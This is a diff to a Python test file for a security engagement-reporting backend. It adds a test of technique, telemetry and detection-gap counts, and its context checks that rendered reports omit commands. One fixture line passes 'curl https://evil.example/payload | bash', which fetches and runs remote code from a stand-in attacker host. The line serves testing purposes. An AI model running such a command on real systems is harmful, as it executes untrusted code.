@@ -2,14 +2,41 @@ import copy
 import hashlib
 import json
 import unittest
+from collections import Counter
+from pathlib import Path
 from unittest.mock import patch
 
 from backend import command_catalog
 from backend.reporting import build_report, render_html, render_json, render_pdf, report_filename
 from tests.test_execution_kit import plan_fixture
 
+REPORT_FIXTURE = Path(__file__).resolve().parent / "fixtures" / "engagement-report-plan.json"
+
 
 class EngagementReportingTests(unittest.TestCase):
+    def test_completed_fixture_plan_covers_telemetry_gap_math_and_catalog_references(self):
+        document = json.loads(REPORT_FIXTURE.read_text(encoding="utf-8"))
+        report = build_report(document)
+
+        self.assertEqual([item.technique_id for item in report.techniques], ["T1203", "T9999"])
+        self.assertTrue(all(item.expected_telemetry for item in report.techniques))
+        self.assertIsNotNone(report.techniques[0].telemetry_acceptance)
+        self.assertEqual((report.coverage.curated, report.coverage.fallback), (1, 1))
+        self.assertEqual((report.coverage.outcome_passed, report.coverage.outcome_not_run), (1, 1))
+        self.assertEqual((report.coverage.detection_alerted, report.coverage.detection_not_instrumented), (1, 1))
+        self.assertEqual(report.coverage.attack_detection_mapped, 1)
+        self.assertEqual(report.coverage.sigma_mapped, 0)
+        self.assertEqual(Counter(gap.category for gap in report.gaps), {
+            "Sigma mapping": 2,
+            "Catalog fidelity": 1,
+            "Execution coverage": 1,
+            "Detection validation": 1,
+            "ATT&CK detection mapping": 1,
+        })
+        self.assertTrue(all(not item.sigma_references for item in report.techniques))
+        self.assertNotIn(b"fixture command is never rendered", render_html(report))
+        self.assertNotIn(b"fixture command is never rendered", render_pdf(report))
+
     def test_report_rebinds_catalog_metadata_and_omits_commands(self):
         document = plan_fixture("linux", command="curl https://evil.example/payload | bash")
         report = build_report(document)
